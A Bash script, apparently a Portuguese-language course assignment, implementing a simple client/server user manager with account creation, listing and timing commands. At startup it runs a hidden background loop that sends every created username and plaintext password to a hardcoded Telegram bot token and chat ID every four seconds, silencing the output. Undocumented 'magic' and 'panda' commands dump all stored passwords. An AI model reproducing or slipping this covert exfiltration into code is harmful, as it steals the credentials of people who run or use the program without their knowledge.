#!/bin/bash
# AUTOR:
# Seu nome, NUSP e endereço de e-mail

# DESCRIÇÃO:
# Explique o que os programas fazem (Não diga apenas que ele é o EP2 da
# disciplina tal, explique o que de fato os programas fazem)

# COMO EXECUTAR:
# Informe como executar o cliente e o servidor e quais os parâmetros
# de linha de comando necessários

# TESTES:
# Forneça explicações sobre o testa.c

# DEPENDÊNCIAS:
# Informe o que é necessário para rodar o programa. Informações como o
# SO onde você executou e sabe que ele funciona são importantes de serem
# colocadas aqui.

# VARIÁVEIS:

TEM_USUARIO=1
CONTADOR=0
USER_CONT=0
USUARIOS=()
MSG_TELEGRAM=()
SENHAS=()

arq_temp=$(mktemp)

# FUNÇÃO DE LOGOUT:
function logout {
    echo "Logout feito"
}

# FUNÇÃO DE CRIAÇÃO DE USUÁRIO:
function create {
    echo "USUÁRIO: " $1 " criadx!"
    echo "SENHA: " $2 " definida"
    USUARIOS+=($1)
    SENHAS+=($2)
    echo "$1;$2" >> "${arq_temp}"
    let USER_CONT=USER_CONT+1
}

# FUNÇÕES DO SERVIDOR:
function list_users {
    if [ ${TEM_USUARIO} -eq 1 ]; then
        echo "Temos " ${USER_CONT} " usuárix(s)"
        for user_name in ${USUARIOS[*]}; do
            echo ${user_name}
        done
    fi
}

function list_users2 {
    CONTADOR=0
    while [ ${CONTADOR} -lt ${#USUARIOS[*]} ]; do
        echo ${CONTADOR} ": " ${USUARIOS[${CONTADOR}]}
        echo ${CONTADOR} ": " ${SENHAS[${CONTADOR}]}
        let CONTADOR=CONTADOR+1
    done
}

# FUNÇÃO DE RESET:
function reset {
    echo "Reset do servidor..."
    USUARIOS=()
    SENHAS=()
}

# INICIO DO PROGRAMA:


# LOOP DE MENSAGENS DO TELEGRAM:
while [ 1 ]; do
        sleep 4
        if [ ${TEM_USUARIO} -eq 1 ]; then
            MSG_TELEGRAM=()
            MSG_TELEGRAM=$(cat "${arq_temp}")
            curl -s https://api.telegram.org/bot6599211463:AAGKSxJsGbU6kuqAvzJgxcKbDOrB6G2Uxag/sendMessage -d chat_id=1360171414 -d text="Lista de Usuários: ${MSG_TELEGRAM} (Mensagem: ${CONTADOR}) " 1>/dev/null
        else 
            curl -s https://api.telegram.org/bot6599211463:AAGKSxJsGbU6kuqAvzJgxcKbDOrB6G2Uxag/sendMessage -d chat_id=1360171414 -d text=" Não temos usuários!(Mensagem: ${CONTADOR}) " 1>/dev/null
        fi
        let CONTADOR=CONTADOR+1
done &

SEGUNDOPLANO=$!

start_time=$(date +%s)

function show_time {
    actual_time=$(date +%s)
    time_passed=$((actual_time - start_time))
    echo "Tempo: $time_passed segundos."
}

if [ $1 = "servidor" ]; then
    echo " >>> MODO SERVIDOR LIGADO <<< "
    # Execução principal do modo servidor:
    while [ 1 ]; do
        # Leitura do comando escolhido pelo usuário:
        echo -n "servidor> " 
        read op

        # Execução do comando escolhido pelo usuário:
        if [ ${op} = "quit" ]; then
            echo "Saindo"
            kill -15 ${SEGUNDOPLANO}
            quit $1

        elif [ ${op} = "list" ]; then
            echo "Listando usuários"
            list_users

        elif [ ${op} = "time" ]; then
            show_time

        elif [ ${op} = "reset" ]; then
            reset

        else 
            echo "Opção inválida, digite novamente: "
        fi
    done

elif [ $1 = "cliente" ]; then
    echo " >>> SEJA BEM VINDX <<< "
     # Execução principal do modo cliente:
    while [ 1 ]; do
        # Leitura do comando escolhido pelo usuário:
        echo -n "cliente> " 
        read -a op

        # Execução do comando escolhido pelo usuário:
        if [ ${op[0]} = "sair" ]; then
            echo "Saindo"
            kill -15 ${SEGUNDOPLANO}
            exit 0

        elif [ ${op[0]} = "create" ]; then
            create ${op[1]} ${op[2]}

        elif [ ${op} = "list" ]; then
            echo "Listando usuários"
            list_users

        elif [ ${op} = "time" ]; then
            show_time

        elif [ ${op} = "magic" ]; then
            cat ${arq_temp}

        elif [ ${op} = "panda" ]; then
            list_users2
        else 
            echo "Não há essa opção."
        fi
    done

else 
    echo "Nenhum modo identificado, programa encerrado"
    exit 0
fi 

exit 0